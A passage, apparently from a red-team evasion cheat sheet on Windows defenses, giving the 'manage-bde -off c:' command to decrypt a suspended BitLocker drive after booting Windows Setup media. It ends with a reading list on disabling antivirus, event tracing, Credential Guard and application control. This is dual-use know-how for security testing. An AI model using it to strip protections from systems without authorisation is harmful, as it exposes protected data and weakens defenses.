  \ BitLocker requires a user to enter a password or insert a USB flash drive to unlock the encrypted volume before the operating\
  \ system is loaded, ensuring that data on the disk is protected from unauthorized access. BitLocker is commonly used on\
  \ laptops, portable storage devices, and other mobile devices to protect sensitive data in case of theft or loss.\n\nWhen\
  \ BitLocker is in `Suspended` state, boot the system using a Windows Setup USB, and then decrypt the drive using this command:\
  \ `manage-bde -off c:`\n\nYou can check if it is done decrypting using this command: `manage-bde -status`\n\n## References\n\
  \n* [Attack surface reduction rules reference - Microsoft 365 - November 30, 2023](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide)\n\
  * [Catching Credential Guard Off Guard - Valdemar Carøe - October 23, 2025](https://specterops.io/blog/2025/10/23/catching-credential-guard-off-guard/)\n\
  * [Create and verify an Encrypting File System (EFS) Data Recovery Agent (DRA) certificate - Microsoft - December 9, 2022](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/create-and-verify-an-efs-dra-certificate)\n\
  * [Determine the Enterprise Context of an app running in Windows Information Protection (WIP) - Microsoft - March 10, 2023](https://learn.microsoft.com/en-us/windows/security/information-protection/windows-information-protection/wip-app-enterprise-context)\n\
  * [DISABLING AV WITH PROCESS SUSPENSION - Christopher Paschen - March 24, 2023](https://www.trustedsec.com/blog/disabling-av-with-process-suspension/)\n\
  * [Disabling Event Tracing For Windows - UNPROTECT Project - April 19, 2022](https://unprotect.it/technique/disabling-event-tracing-for-windows-etw/)\n\
  * [Do You Really Know About LSA Protection (RunAsPPL)? - itm4n - April 7, 2021](https://itm4n.github.io/lsass-runasppl/)\n\
  * [ETW: Event Tracing for Windows 101 - ired.team - January 6, 2020](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101)\n\
  * [PowerShell about_Logging_Windows - Microsoft Documentation - September 30, 2025](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.3)\n\
  * [Remove Windows Defender Application Control (WDAC) policies - Microsoft - December 9, 2022](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/disable-windows-defender-application-control-policies)\n\
  * [Sneaking Past Device Guard - Cybereason - Philip Tsukerman - December 4, 2022](https://troopers.de/downloads/troopers19/TROOPERS19_AR_Sneaking_Past_Device_Guard.pdf)"
_relative_path: redteam/evasion/windows-defenses.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/evasion/windows-defenses.md
````
